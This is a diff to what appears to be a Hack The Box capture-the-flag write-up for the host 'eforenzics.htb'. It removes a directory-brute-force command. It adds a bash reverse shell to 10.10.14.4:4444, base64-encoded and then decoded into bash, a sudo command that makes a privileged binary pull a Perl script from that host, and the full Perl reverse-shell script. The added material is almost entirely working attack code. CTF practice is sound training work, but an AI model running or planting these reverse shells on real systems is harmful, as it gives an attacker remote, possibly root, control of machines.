@@ -37,7 +37,26 @@ Nmap done: 1 IP address (1 host up) scanned in 31.93 seconds
 
 
 
-./go/bin/gobuster dir -u http://eforenzics.htb -w ~/gobuster-dir/dsstorewordlist.txt
 
+```
 echo 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1' | base64
 echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMQo='|base64 -d|bash|
+```
+
+```
+sudo /usr/bin/binary 10.10.14.4/shell.pl lDnxUysaQn
+```
+
+### shell.pl
+```
+use Socket;
+$i="10.10.14.4";
+$p=4444;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){
+ open(STDIN,">&S");open(STDOUT,">&S");
+ open(STDERR,">&S");exec("/bin/bash -i");
+};
+```
+
+
